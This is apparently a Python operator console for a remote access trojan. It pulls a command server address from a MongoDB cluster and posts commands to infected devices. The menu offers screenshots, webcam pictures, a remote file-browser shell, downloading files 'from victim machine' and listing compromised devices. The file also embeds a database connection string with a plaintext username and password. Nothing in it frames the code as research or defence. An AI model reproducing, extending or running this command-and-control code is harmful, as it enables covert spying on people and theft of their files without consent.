import requests
import pymongo
import json
import os

privatekey = 'admin'
client = pymongo.MongoClient("mongodb+srv://test00:Abc123@cluster0.qajos.mongodb.net/myFirstDatabase?retryWrites=true&w=majority")
conn = client.main 
col = conn.server

# gets url from mongodb
array = list(col.find({'p63': 'p63'}))

# gives updates command for client
def main(DeviceId, commandId, data):
  try:
    dataInput = {'admin': privatekey, 'id': int(commandId), 'deviceName': DeviceId, 'data': data}
    response = requests.post(str(str(array[0]['server'])) + '/command', json=dataInput)
    print(response.content.decode("utf-8"))
  except:
    print('enter vaild command id or device name')

# file browser shell
def shell(DeviceId):
  os.system('cls')
  print('\ncommands:- \ncd.. :- move one directory up \ncd C:/dir_name :- cd to a folder/directory \ndir :- displays current directory folders and files \n')
  def main():
    data0 = input('enter data(type exit to exit):- ')
    if data0 != 'exit':
      try:
        # updates data with new command
        dataInput = {'admin': privatekey, 'id': 3, 'deviceName': DeviceId, 'data': data0}
        response = requests.post(str(str(array[0]['server'])) + '/command', json=dataInput)

        # checks if api request was successfull
        if str(response.content.decode("utf-8")) != 'success':
          print('error, please try again')
          main()
        else:
          # gets new updated data after the shell request was executed
          response0 = requests.get(str(array[0]['server']) + '/get-data')
          if data0 == 'dir':
            print(json.loads(response0.content.decode("utf-8"))['shell'])
          else:
            print('success')
          main()

      except:
        print('\nenter vaild command id or device name')
    else:
      return

  main()

while True:
  def main0():
    os.system('cls')
    print('commands:- \n1)get screenshot \n2)get webcam picture \n3)browse files \n4)download files from victim machine \n5) list all devices')
    id = input('Enter command id:- ')
    if str(id) == '5':
      col0 = conn.slave
      for x in col0.find({}, {"_id":0, "id": 1}): 
        print(x)
      input('\nhit enter to continue...')
      main0()

    name = input('Enter device name:- ')
    data0 = ''
    if str(id) == '3':
      shell(name)
    if str(id) == '4':
      data0 = input('enter dir along with file name and extension (eg:- C:/Users/Admin/Desktop/image.jpeg):- ')
      main(name, id, data0)
    else:
      main(name, id, data0)
  main0()